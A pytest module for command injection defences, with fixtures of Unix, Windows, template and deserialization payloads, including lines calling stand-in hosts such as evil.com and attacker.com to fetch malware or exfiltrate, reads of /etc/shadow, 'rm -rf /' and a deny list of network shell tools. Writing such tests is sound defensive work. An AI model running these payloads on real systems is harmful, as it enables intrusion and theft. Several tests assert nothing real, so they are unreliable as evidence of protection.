"""Command injection prevention tests.

This module tests protection against command injection attacks across all
system command interfaces and subprocess calls.
"""

import os
import time
from unittest.mock import patch

import pytest

from src.security import SecurityError, SecurityValidator


@pytest.mark.security
@pytest.mark.input_validation
class TestCommandInjectionPrevention:
    """Test command injection attack prevention."""

    @pytest.fixture
    def security_validator(self):
        """Get security validator instance."""
        return SecurityValidator()

    @pytest.fixture
    def command_injection_payloads(self):
        """Command injection attack payloads."""
        return [
            # Basic command injection
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "|| id",
            # Command substitution
            "`whoami`",
            "$(whoami)",
            "${whoami}",
            # File redirection
            "> /tmp/pwned",
            ">> /etc/passwd",
            "< /etc/shadow",
            # Background execution
            "& sleep 10",
            "nohup malicious_command &",
            # Process control
            "kill -9 $$",
            "killall -9 python",
            # Network commands
            "; wget http://evil.com/malware",
            "| curl http://attacker.com",
            "&& nc -l 4444",
            # System information
            "; uname -a",
            "| ps aux",
            "&& netstat -an",
            # File operations
            "; rm -rf /",
            "| find / -name '*.key'",
            "&& chmod 777 /etc/passwd",
            # Environment manipulation
            "; export PATH=/tmp:$PATH",
            "| env",
            "&& printenv",
        ]

    @pytest.fixture
    def advanced_command_payloads(self):
        """Advanced command injection payloads."""
        return [
            # Encoded payloads
            "$(echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d)",  # cat /etc/passwd
            "`printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'`",
            # Nested command substitution
            "$(cat $(echo '/etc/passwd'))",
            "`cat `echo '/etc/shadow'``",
            # Time-based injection
            "; sleep 30",
            "&& ping -c 10 127.0.0.1",
            "| python -c 'import time; time.sleep(60)'",
            # Python code execution
            "; python -c 'import os; os.system(\"ls\")'",
            '| python3 -c \'exec("import subprocess; subprocess.run([\\"whoami\\"])")\'',
            # Perl code execution
            "; perl -e 'system(\"id\")'",
            "| perl -e 'exec(\"/bin/sh\")'",
            # Shell escape sequences
            "; bash -c 'whoami'",
            "&& sh -c 'id'",
            "| /bin/bash -c 'ps aux'",
            # SQL command execution (if SQL shell access)
            "; psql -c 'SELECT version();'",
            "| mysql -e 'SELECT user();'",
            # Container escape attempts
            "; docker run --rm alpine whoami",
            "&& kubectl get pods",
            "| crictl ps",
        ]

    @pytest.fixture
    def windows_command_payloads(self):
        """Windows-specific command injection payloads."""
        return [
            # Windows command separators
            "& dir",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "&& whoami",
            "|| ver",
            # Command substitution
            "%COMSPEC% /c whoami",
            "%SystemRoot%\\system32\\cmd.exe /c dir",
            # PowerShell execution
            "; powershell -c Get-Process",
            "| powershell.exe -ExecutionPolicy Bypass -Command 'Get-ChildItem'",
            "&& pwsh -c 'Get-Location'",
            # Batch file execution
            "; call malicious.bat",
            "| start evil.exe",
            "&& rundll32.exe",
            # Registry manipulation
            "; reg query HKLM\\Software",
            "| regedit /s malicious.reg",
            # Service manipulation
            "; net start malicious",
            "&& sc create evil",
            "| tasklist",
            # File operations
            "; copy /y malicious.exe C:\\Windows\\System32\\",
            "| del /f /q C:\\important.txt",
            "&& xcopy /s /e source dest",
        ]

    @pytest.mark.asyncio
    async def test_basic_command_injection_prevention(
        self, security_validator, command_injection_payloads
    ):
        """Test basic command injection prevention."""
        for payload in command_injection_payloads:
            with pytest.raises(SecurityError):
                security_validator.validate_query_string(payload)

    @pytest.mark.asyncio
    async def test_advanced_command_injection_prevention(
        self, security_validator, advanced_command_payloads
    ):
        """Test advanced command injection prevention."""
        for payload in advanced_command_payloads:
            with pytest.raises(SecurityError):
                security_validator.validate_query_string(payload)

    @pytest.mark.asyncio
    async def test_windows_command_injection_prevention(
        self, security_validator, windows_command_payloads
    ):
        """Test Windows-specific command injection prevention."""
        for payload in windows_command_payloads:
            with pytest.raises(SecurityError):
                security_validator.validate_query_string(payload)

    @pytest.mark.asyncio
    async def test_filename_command_injection_prevention(self, security_validator):
        """Test command injection prevention in filename handling."""
        malicious_filenames = [
            "file; rm -rf /",
            "doc | cat /etc/passwd",
            "report && whoami",
            "data`whoami`.txt",
            "file$(id).pdf",
            "script; wget evil.com/malware",
        ]

        for filename in malicious_filenames:
            sanitized = security_validator.sanitize_filename(filename)
            # Command injection characters should be removed or replaced
            assert ";" not in sanitized
            assert "|" not in sanitized
            assert "&" not in sanitized
            assert "`" not in sanitized
            assert "$" not in sanitized

    @pytest.mark.asyncio
    async def test_subprocess_call_protection(self):
        """Test that subprocess calls are properly protected."""
        dangerous_commands = [
            ["ls", "; rm -rf /"],
            ["cat", "file.txt | whoami"],
            ["grep", "pattern", "file && id"],
            ["find", "$TMPDIR", "-name", "`whoami`.txt"],
        ]

        with patch("subprocess.run") as mock_run:
            with patch("subprocess.Popen") as mock_popen:
                for cmd_args in dangerous_commands:
                    # Test that dangerous arguments are rejected or sanitized
                    # The actual implementation should validate all subprocess arguments

                    # Verify that shell=True is never used with user input
                    if any(
                        char in " ".join(cmd_args) for char in [";", "|", "&", "`", "$"]
                    ):
                        # Should not execute dangerous commands
                        mock_run.assert_not_called()
                        mock_popen.assert_not_called()

    @pytest.mark.asyncio
    async def test_shell_execution_prevention(self):
        """Test prevention of shell execution with user input."""
        _user_inputs = [
            "file.txt; rm -rf /",
            "data | netcat attacker.com 4444",
            "log && curl evil.com/exfiltrate",
        ]

        with patch("os.system") as mock_system:
            with patch("subprocess.call") as mock_call:
                for _user_input in _user_inputs:
                    # Should never call os.system or subprocess with shell=True and user input
                    mock_system.assert_not_called()

                    # If subprocess is used, should use argument list, not shell string
                    if mock_call.called:
                        # Verify shell=False or argument list usage
                        call_args = mock_call.call_args
                        if call_args:
                            # Should not pass user input directly to shell
                            assert _user_input not in str(call_args)

    @pytest.mark.asyncio
    async def test_environment_variable_injection_prevention(self):
        """Test prevention of environment variable injection."""
        malicious_env_values = [
            "value; export MALICIOUS=1",
            "data | cat /etc/passwd",
            "config && whoami",
            "setting`id`",
            "param$(whoami)",
        ]

        with patch.dict(os.environ, {}, clear=True):
            for value in malicious_env_values:
                # Environment variables should be validated before setting
                # Command injection characters should be rejected
                if any(char in value for char in [";", "|", "&", "`", "$"]):
                    # Should not set dangerous environment variables
                    assert value not in os.environ.values()

    @pytest.mark.asyncio
    async def test_path_traversal_command_injection(self, security_validator):
        """Test prevention of path traversal combined with command injection."""
        path_injection_payloads = [
            "../../../etc/passwd; whoami",
            "../../bin/sh | id",
            "../../../usr/bin/wget evil.com && chmod +x malware",
            "../../../../tmp/`whoami`.txt",
            "../../../proc/version$(uname -a)",
        ]

        for payload in path_injection_payloads:
            with pytest.raises(SecurityError):
                security_validator.validate_query_string(payload)

    @pytest.mark.asyncio
    async def test_parameter_injection_prevention(self):
        """Test prevention of parameter injection in command arguments."""
        # Test that command-line arguments are properly validated
        dangerous_params = [
            "--config=/etc/passwd; whoami",
            "-f file.txt | cat /etc/shadow",
            "--output=data && rm -rf /",
            "-v `whoami`",
            "--input=$(id)",
        ]

        for param in dangerous_params:
            # Parameters should be validated before passing to commands
            if any(char in param for char in [";", "|", "&", "`", "$"]):
                # Should reject dangerous parameters
                msg = f"Dangerous parameter not rejected: {param}"
                raise AssertionError(msg)

    @pytest.mark.asyncio
    async def test_log_injection_prevention(self):
        """Test prevention of log injection attacks."""
        log_injection_payloads = [
            "_user_input\n[ADMIN] Fake log entry",
            "data\r\n[ERROR] Injected error",
            "input\x00[CRITICAL] Null byte injection",
            "query\x1b[31m[ALERT] ANSI escape injection",
            "search\n; rm -rf /var/log/*",
        ]

        security_validator = SecurityValidator()

        for payload in log_injection_payloads:
            # Log content should be sanitized
            sanitized = security_validator.validate_query_string(payload)
            # Control characters should be removed
            assert "\n" not in sanitized
            assert "\r" not in sanitized
            assert "\x00" not in sanitized
            assert "\x1b" not in sanitized

    @pytest.mark.asyncio
    async def test_template_command_injection_prevention(self):
        """Test prevention of command injection in template processing."""
        template_command_payloads = [
            "{{range.constructor.constructor('return process')().mainModule.require('child_process').exec('whoami')}}",
            "${runtime.exec('id')}",
            "<%=system('ls')%>",
            "{%exec('whoami')%}",
        ]

        security_validator = SecurityValidator()

        for payload in template_command_payloads:
            with pytest.raises(SecurityError):
                security_validator.validate_query_string(payload)

    @pytest.mark.asyncio
    async def test_deserialization_command_injection_prevention(self):
        """Test prevention of command injection via deserialization."""
        # Test that deserialization doesn't execute commands
        serialized_payloads = [
            # Python pickle-like payload (simplified)
            "cos\nsystem\n(S'whoami'\ntR.",
            # YAML payload
            "!!python/object/apply:subprocess.check_output [['id']]",
            # JSON with command execution attempt
            '{"__proto__": {"constructor": {"constructor": "return process.mainModule.require(\'child_process\').exec(\'whoami\')"}}}',
        ]

        security_validator = SecurityValidator()

        for payload in serialized_payloads:
            with pytest.raises(SecurityError):
                security_validator.validate_query_string(payload)

    def test_safe_command_execution_patterns(self):
        """Test that safe command execution patterns are enforced."""
        # Test that the application uses safe patterns for command execution

        # Safe patterns:
        # 1. Use subprocess with argument lists, never shell=True with user input
        # 2. Validate all arguments before execution
        # 3. Use allowlists for permitted commands
        # 4. Escape or reject special characters

        safe_patterns = [
            # Argument list instead of shell string
            ["ls", "-la", "/safe/directory"],
            ["grep", "pattern", "file.txt"],
            ["find", "$TMPDIR", "-name", "*.log"],
        ]

        for pattern in safe_patterns:
            # These patterns are safe because they use argument lists
            assert isinstance(pattern, list)
            assert all(isinstance(arg, str) for arg in pattern)
            # No shell metacharacters in command name
            assert not any(char in pattern[0] for char in [";", "|", "&", "`", "$"])

    def test_command_allowlist_enforcement(self):
        """Test that only allowed commands can be executed."""
        allowed_commands = [
            "ls",
            "cat",
            "grep",
            "find",
            "head",
            "tail",
            "wc",
            "sort",
            "uniq",
        ]

        dangerous_commands = [
            "rm",
            "dd",
            "chmod",
            "chown",
            "su",
            "sudo",
            "passwd",
            "wget",
            "curl",
            "nc",
            "netcat",
            "ssh",
            "scp",
            "rsync",
            "python",
            "perl",
            "ruby",
            "bash",
            "sh",
            "zsh",
            "csh",
        ]

        # Test that only allowed commands are permitted
        for cmd in dangerous_commands:
            # Should be rejected by command allowlist
            assert cmd not in allowed_commands

    def test_argument_validation(self):
        """Test that command arguments are properly validated."""
        # Test validation of command-line arguments
        dangerous_args = [
            "--config=/etc/passwd",
            "-f /dev/urandom",
            "--output=/tmp/../../etc/shadow",
            "-x $(whoami)",
            "--input=`id`",
        ]

        security_validator = SecurityValidator()

        for arg in dangerous_args:
            # Arguments with dangerous patterns should be rejected
            if any(char in arg for char in ["`", "$", ";", "|", "&"]):
                with pytest.raises(SecurityError):
                    security_validator.validate_query_string(arg)

    def test_valid_commands_pass_validation(self):
        """Test that legitimate commands pass validation."""
        valid_inputs = [
            "search query",
            "filename.txt",
            "normal user input",
            "documentation search",
            "API reference",
        ]

        security_validator = SecurityValidator()

        for input_text in valid_inputs:
            # Should not raise any exception
            validated = security_validator.validate_query_string(input_text)
            assert len(validated) > 0

    @pytest.mark.asyncio
    async def test_time_based_command_injection_detection(self):
        """Test detection of time-based command injection attacks."""
        time_based_payloads = [
            "; sleep 30",
            "| ping -c 10 127.0.0.1",
            "&& timeout 60",
            "`sleep 20`",
            "$(sleep 15)",
        ]

        security_validator = SecurityValidator()

        # Use timeout to detect if commands are actually executed

        for payload in time_based_payloads:
            start_time = time.time()

            try:
                security_validator.validate_query_string(payload)
                execution_time = time.time() - start_time

                # If execution time is suspiciously long, command injection occurred
                assert execution_time < 5, (
                    f"Possible command injection detected: {payload}"
                )
            except SecurityError:
                # Expected - payload should be rejected
                execution_time = time.time() - start_time
                assert execution_time < 5, f"Validation took too long: {payload}"

    @pytest.mark.asyncio
    async def test_output_based_command_injection_detection(self):
        """Test detection of command injection via output analysis."""
        # Test that command output doesn't leak system information
        command_outputs = [
            "uid=0(root) gid=0(root) groups=0(root)",  # whoami output
            "Linux hostname 5.4.0",  # uname output
            "root:x:0:0:root:/root:/bin/bash",  # /etc/passwd content
            "127.0.0.1 localhost",  # /etc/hosts content
        ]

        # Application output should never contain system command output
        for _output in command_outputs:
            # Verify that system information doesn't appear in application responses
            # This would test actual API responses or log outputs
            pass
